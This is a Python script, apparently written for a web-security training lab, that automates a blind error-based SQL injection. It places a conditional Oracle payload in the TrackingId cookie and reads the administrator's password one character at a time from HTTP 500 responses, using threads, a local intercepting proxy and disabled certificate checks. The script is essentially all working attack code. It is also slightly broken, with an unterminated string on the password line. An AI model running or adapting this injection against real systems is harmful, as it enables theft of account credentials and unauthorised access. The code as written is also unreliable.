import requests, string, sys, warnings, time, concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

req = requests.Session()
url = "change here"
password = "

# For debugging
proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080',
    }

# Payloads
chars = string.digits + string.ascii_letters 
index = list(range(1,21))
# sqli=" 'AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),§P1§,1) = '§P2§') THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a"

def brute(str_index):
    for char in chars:
        cookies = {
            "session" : "sbUBhykKqypGOmXnwmjysolOIKDeEGOx",
            "TrackingId" : f"Jt22OSM4htJPbhgS'AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{str_index},1) = '{char}') THEN to_char(1/0) ELSE 'a' END FROM dual) = 'a",
            }
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if resp.status_code == 500:
            found = char
            break
    return found

with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    processes = executor.map(brute, index)

for c in processes:
    sys.stdout.write(f"\r[+] Extracting Password: {password}{c}")
    password += c